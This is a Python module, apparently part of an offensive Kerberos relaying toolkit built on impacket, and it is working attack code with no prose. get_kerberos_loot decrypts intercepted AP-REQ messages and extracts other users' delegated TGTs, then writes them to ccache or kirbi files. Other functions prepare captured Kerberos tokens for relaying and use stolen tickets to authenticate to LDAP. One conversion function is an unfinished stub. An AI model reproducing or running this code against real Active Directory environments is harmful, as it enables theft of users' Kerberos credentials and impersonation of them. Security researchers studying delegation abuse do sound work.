from __future__ import unicode_literals
import struct
import datetime
import random
from binascii import unhexlify, hexlify
from pyasn1.type.univ import noValue
from pyasn1.codec.der import decoder, encoder
from pyasn1.error import PyAsn1Error
from ldap3 import Server, Connection, NTLM, ALL, SASL, KERBEROS
from ldap3.core.results import RESULT_STRONGER_AUTH_REQUIRED
from ldap3.operation.bind import bind_operation
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from impacket.krb5.gssapi import KRB5_AP_REQ, GSS_C_DELEG_FLAG
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    Ticket as TicketAsn1, EncTGSRepPart, EncTicketPart, AD_IF_RELEVANT, Ticket as TicketAsn1, KRB_CRED, EncKrbCredPart

from impacket.krb5.crypto import Key, _enctype_table, Enctype, InvalidChecksum, string_to_key
from .krbcredccache import KrbCredCCache
from .spnego import GSSAPIHeader_SPNEGO_Init, GSSAPIHeader_KRB5_AP_REQ
from impacket import LOG
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGS
from Cryptodome.Hash import HMAC, MD4

def get_auth_data(token, options):
    # Do we have a Krb ticket?
    blob = decoder.decode(token, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
    data = blob['innerContextToken']['negTokenInit']['mechToken']
    try:
        payload = decoder.decode(data, asn1Spec=GSSAPIHeader_KRB5_AP_REQ())[0]
    except PyAsn1Error:
        raise Exception('Error obtaining Kerberos data')
    # If so, assume all is fine and we can just pass this on to the legit server
    # we just need to get the correct target name
    apreq = payload['apReq']

    # Get ticket data
    domain = str(apreq['ticket']['realm']).lower()
    # Assume this is NT_SRV_INST with 2 labels (not sure this is always the case)
    sname = '/'.join([str(item) for item in apreq['ticket']['sname']['name-string']])

    # We dont actually know the client name, either use unknown$ or use the user specified
    if options.victim:
        username = options.victim
    else:
        username = f"unknown{random.randint(0, 10000):04d}$"
    return {
        "domain": domain,
        "username": username,
        "krbauth": token,
        "service": sname,
        "apreq": apreq
    }

def get_kerberos_loot(token, options):
    from pyasn1 import debug
    # debug.setLogger(debug.Debug('all'))
    # Do we have a Krb ticket?
    blob = decoder.decode(token, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
    # print str(blob)

    data = blob['innerContextToken']['negTokenInit']['mechToken']

    try:
        payload = decoder.decode(data, asn1Spec=GSSAPIHeader_KRB5_AP_REQ())[0]
    except PyAsn1Error:
        raise Exception('Error obtaining Kerberos data')
    # print payload
    # It is an AP_REQ
    decodedTGS = payload['apReq']
    # print decodedTGS

    # Get ticket data

    cipherText = decodedTGS['ticket']['enc-part']['cipher']

    # Key Usage 2
    # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
    #  application session key), encrypted with the service key
    #  (section 5.4.2)

    newCipher = _enctype_table[int(decodedTGS['ticket']['enc-part']['etype'])]

    # Create decryption keys from specified Kerberos keys
    if options.hashes is not None:
        nthash = options.hashes.split(':')[1]
    else:
        nthash = ''

    aesKey = options.aeskey or ''

    allciphers = [
        int(constants.EncryptionTypes.rc4_hmac.value),
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value)
    ]

    # Store Kerberos keys
    # TODO: get the salt from preauth info (requires us to send AS_REQs to the DC)
    keys = {}

    if nthash != '':
        keys[int(constants.EncryptionTypes.rc4_hmac.value)] = unhexlify(nthash)
    if aesKey != '':
        if len(aesKey) == 64:
            keys[int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)] = unhexlify(aesKey)
        else:
            keys[int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value)] = unhexlify(aesKey)

    ekeys = {}
    for kt, key in keys.items():
        ekeys[kt] = Key(kt, key)

    # Calculate Kerberos keys from specified password/salt
    if options.password and options.salt:
        for cipher in allciphers:
            if cipher == 23 and options.israwpassword:
                # RC4 calculation is done manually for raw passwords
                md4 = MD4.new()
                md4.update(options.password)
                ekeys[cipher] = Key(cipher, md4.digest())
            else:
                # Do conversion magic for raw passwords
                if options.israwpassword:
                    rawsecret = options.password.decode('utf-16-le', 'replace').encode('utf-8', 'replace')
                else:
                    # If not raw, it was specified from the command line, assume it's not UTF-16
                    rawsecret = options.password
                ekeys[cipher] = string_to_key(cipher, rawsecret, options.salt)
            LOG.debug('Calculated type %d Kerberos key: %s', cipher, hexlify(ekeys[cipher].contents))

    # Select the correct encryption key
    try:
        key = ekeys[decodedTGS['ticket']['enc-part']['etype']]
    # This raises a KeyError (pun intended) if our key is not found
    except KeyError:
        LOG.error('Could not find the correct encryption key! Ticket is encrypted with keytype %d, but keytype(s) %s were supplied',
                  decodedTGS['ticket']['enc-part']['etype'],
                  ', '.join([str(enctype) for enctype in ekeys.keys()]))
        return None

    # Recover plaintext info from ticket
    try:
        plainText = newCipher.decrypt(key, 2, cipherText)
    except InvalidChecksum:
        LOG.error('Ciphertext integrity failed. Most likely the account password or AES key is incorrect')
        if options.salt:
            LOG.info('You specified a salt manually. Make sure it has the correct case.')
        return
    LOG.debug('Ticket decrypt OK')
    encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
    sessionKey = Key(encTicketPart['key']['keytype'], bytes(encTicketPart['key']['keyvalue']))

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)

    # print encTicketPart
    flags = encTicketPart['flags'].asBinary()
    # print flags
    # for flag in TicketFlags:
    #     if flags[flag.value] == '1':
    #         print flag
    # print flags[TicketFlags.ok_as_delegate.value]
    cipherText = decodedTGS['authenticator']['cipher']
    newCipher = _enctype_table[int(decodedTGS['authenticator']['etype'])]
    # Recover plaintext info from authenticator
    plainText = newCipher.decrypt(sessionKey, 11, cipherText)

    authenticator = decoder.decode(plainText, asn1Spec=Authenticator())[0]
    # print authenticator

    # The checksum may contain the delegated ticket
    cksum = authenticator['cksum']
    if cksum['cksumtype'] != 32771:
        raise Exception('Checksum is not KRB5 type: %d' % cksum['cksumtype'])

    # Checksum as in 4.1.1 [RFC4121]
    # Fields:
    # 0-3 Length of channel binding info (fixed at 16)
    # 4-19 channel binding info
    # 20-23 flags
    # 24-25 delegation option identifier
    # 26-27 length of deleg field
    # 28..(n-1) KRB_CRED message if deleg is used (n = length of deleg + 28)
    # n..last  extensions
    flags = struct.unpack('<L', bytes(cksum['checksum'])[20:24])[0]
    # print flags
    if not flags & GSS_C_DELEG_FLAG:
        LOG.error('Delegate info not set, cannot extract ticket!')
        LOG.error('Make sure the account you use has unconstrained delegation rights')
        return

    dlen = struct.unpack('<H', bytes(cksum['checksum'])[26:28])[0]
    deldata = bytes(cksum['checksum'])[28:28+dlen]
    creds = decoder.decode(deldata, asn1Spec=KRB_CRED())[0]
    # print creds
    subkey = Key(authenticator['subkey']['keytype'], bytes(authenticator['subkey']['keyvalue']))
    newCipher = _enctype_table[int(creds['enc-part']['etype'])]

    plainText = newCipher.decrypt(sessionKey, 14, bytes(creds['enc-part']['cipher']))
    # print plainText
    # Now we got the EncKrbCredPart
    enc_part = decoder.decode(plainText, asn1Spec=EncKrbCredPart())[0]

    for i, tinfo in enumerate(enc_part['ticket-info']):
        # This is what we are after :)
        username = '/'.join([str(item) for item in tinfo['pname']['name-string']])
        realm = str(tinfo['prealm'])
        fullname = '%s@%s' % (username, realm)
        sname = Principal([str(item) for item in tinfo['sname']['name-string']])
        LOG.info('Got ticket for %s [%s]', fullname, sname)
        ticket = creds['tickets'][i]
        filename = '%s_%s' % (fullname, sname)
        saveformat = options.format
        LOG.info('Saving ticket in %s.%s', filename, saveformat)
        ccache = KrbCredCCache()
        ccache.fromKrbCredTicket(ticket, tinfo)
        if saveformat == 'ccache':
            ccache.saveFile(filename + '.ccache')
        else:
            # Save as Kirbi
            oc = KRB_CRED()
            oc['tickets'].append(ticket)
            oc['enc-part']['etype'] = 0
            new_enc_part = EncKrbCredPart()
            new_enc_part['ticket-info'].append(tinfo)
            oc['enc-part']['cipher'] = encoder.encode(new_enc_part)
            ocdata = encoder.encode(oc)
            with open(filename + '.kirbi', 'wb') as outfile:
                outfile.write(ocdata)

    data = {
        'username': username,
        'domain': realm,
        # We take it from the ccache since this already has a helper function to get
        # it in the right format.
        'tgt': ccache.credentials[0].toTGT()
    }
    return data

def kirbi2ccache(kirbifile, ccachefile):
    with open(kirbifile, 'rb') as infile:
        data = infile.read()
    creds = decoder.decode(data, asn1Spec=KRB_CRED())[0]
    # This shouldn't be encrypted normally
    if creds['enc-part']['etype'] != 0:
        raise Exception('Ticket info is encrypted with cipher other than null')
    enc_part = decoder.decode(creds['enc-part']['cipher'], asn1Spec=EncKrbCredPart())[0]
    tinfo = enc_part['ticket-info']
    ccache = KrbCredCCache()
    # Enumerate all
    for i, tinfo in enumerate(tinfo):
        ccache.fromKrbCredTicket(creds['tickets'][i], tinfo)
    ccache.saveFile(ccachefile)

def ccache2kirbi(ccachefile, kirbifile):
    ccache = KrbCredCCache.loadFile(ccachefile)
    ### TODO from here ###

def ldap_kerberos_auth(ldapconnection, authdata_gssapi):
    # Hackery to authenticate with ldap3 using impacket Kerberos stack
    # I originally wrote this for BloodHound.py, but it works fine (tm) here too
    ldapconnection.open(read_server_info=False)
    request = bind_operation(ldapconnection.version, SASL, None, None, ldapconnection.sasl_mechanism, authdata_gssapi)
    response = ldapconnection.post_send_single_response(ldapconnection.send('bindRequest', request, None))[0]
    ldapconnection.result = response
    if response['result'] == 0:
        ldapconnection.bound = True
        ldapconnection.refresh_server_info()
    return response['result'] == 0

def build_apreq(domain, kdc, tgt, username, serviceclass, hostname, tgs=None):
    # Build a protocol agnostic AP-REQ using the TGT we have, wrapped in GSSAPI/SPNEGO
    username = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    servername = Principal('%s/%s' % (serviceclass, hostname), type=constants.PrincipalNameType.NT_SRV_INST.value)
    if tgs:
        # If the TGS is already supplied, use that instead of TGT
        tgs, cipher, _, sessionkey = tgs
    else:
        tgs, cipher, _, sessionkey = getKerberosTGS(servername, domain, kdc,
                                                    tgt['KDC_REP'], tgt['cipher'], tgt['sessionKey'])

    # Let's build a NegTokenInit with a Kerberos AP_REQ
    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', username.components_to_asn1)
    now = datetime.datetime.utcnow()

    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionkey, 11, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    blob['MechToken'] = encoder.encode(apReq)
    return blob.getData()

def ldap_kerberos(domain, kdc, tgt, username, ldapconnection, hostname, tgs=None):
    gssapi_data = build_apreq(domain, kdc, tgt, username, 'ldap', hostname, tgs)

    return ldap_kerberos_auth(ldapconnection, gssapi_data)


